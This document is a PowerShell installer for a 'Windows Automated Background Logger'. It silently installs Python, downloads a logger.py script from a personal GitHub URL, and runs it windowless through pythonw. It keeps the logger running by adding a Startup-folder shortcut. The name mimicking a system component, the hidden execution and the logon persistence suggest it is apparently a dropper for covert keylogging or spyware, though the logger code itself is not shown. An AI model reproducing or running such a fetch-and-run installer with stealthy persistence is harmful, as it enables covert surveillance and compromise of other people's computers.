# =============================================
#   Windows Automated Background Logger Setup
#   (Final Version - Uses Startup Folder Shortcut)
# =============================================

$installDir = "$env:LOCALAPPDATA\WindowsLogger"

if (!(Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}

$loggerUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/logger.py"
$reqUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/requirements.txt"

Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "   Automated Logger Setup Process" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

# 1. Check Python
Write-Host "[*] Checking for Python..." -ForegroundColor Yellow
$pythonInstalled = $false

if (Get-Command python -ErrorAction SilentlyContinue) {
    $pythonVersion = & python --version
    Write-Host "[+] Python is already installed: $pythonVersion" -ForegroundColor Green
    $pythonInstalled = $true
}

if (-not $pythonInstalled) {
    Write-Host "[-] Python not found. Downloading Python 3.12.8..." -ForegroundColor Yellow
    $pythonUrl = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    
    Write-Host "[*] Installing Python silently..." -ForegroundColor Yellow
    $installArgs = "/quiet PrependPath=1 Include_test=0 Include_pip=1"
    Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -PassThru | Out-Null
    
    Remove-Item $installerPath -Force
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    Write-Host "[+] Python installed successfully!" -ForegroundColor Green
}

# 2. Download files
Write-Host "[*] Downloading script files..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $loggerUrl -OutFile "$installDir\logger.py" -TimeoutSec 30
    Invoke-WebRequest -Uri $reqUrl -OutFile "$installDir\requirements.txt" -TimeoutSec 30
    Write-Host "[+] Files downloaded successfully." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download files!" -ForegroundColor Red
    Exit
}

# 3. Install requirements
Write-Host "[*] Installing required Python packages..." -ForegroundColor Yellow
Set-Location $installDir

python -m pip install --upgrade pip setuptools wheel --quiet

$pipArgs = @("-m", "pip", "install", "-r", "requirements.txt", "--no-cache-dir", "--timeout", "180", "--retries", "10", "--quiet")
& python $pipArgs

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] All packages installed successfully." -ForegroundColor Green
} else {
    Write-Host "[!] Installation had issues. Trying alternative..." -ForegroundColor Yellow
    python -m pip install -r requirements.txt --no-cache-dir --timeout 200 --retries 15
}

# 4. Create Dynamic start_logger.bat
Write-Host "[*] Creating dynamic startup batch file..." -ForegroundColor Yellow

$batContent = @'
@echo off
:: Dynamic Logger Starter

set "SCRIPT=%LOCALAPPDATA%\WindowsLogger\logger.py"

:: Find pythonw.exe
set "PYTHONW="
for %%i in (pythonw.exe) do set "PYTHONW=%%~$PATH:i"
if not defined PYTHONW (
    set "PYTHONW=%LOCALAPPDATA%\Programs\Python\Python312\pythonw.exe"
)

if exist "%PYTHONW%" (
    start "" "%PYTHONW%" "%SCRIPT%"
) else (
    start "" pythonw "%SCRIPT%"
)
'@

$batPath = "$installDir\start_logger.bat"
$batContent | Out-File -FilePath $batPath -Encoding UTF8 -Force
Write-Host "[+] Batch file created." -ForegroundColor Green

# 5. Create Shortcut in Startup Folder (Most Reliable Method)
Write-Host "[*] Adding shortcut to Startup Folder..." -ForegroundColor Yellow

$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = "$startupFolder\WindowsLogger.lnk"

$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = $batPath
$Shortcut.WorkingDirectory = $installDir
$Shortcut.Save()

Write-Host "[+] Shortcut added to Startup folder successfully." -ForegroundColor Green

# 6. Remove old Registry entry (if exists)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsBackgroundLogger" -ErrorAction SilentlyContinue

Write-Host "=============================================" -ForegroundColor Green
Write-Host "[✓] Setup completed successfully!" -ForegroundColor Green
Write-Host "[i] Installation folder : $installDir" -ForegroundColor Cyan
Write-Host "[i] Startup method      : Shortcut in Startup Folder" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Green
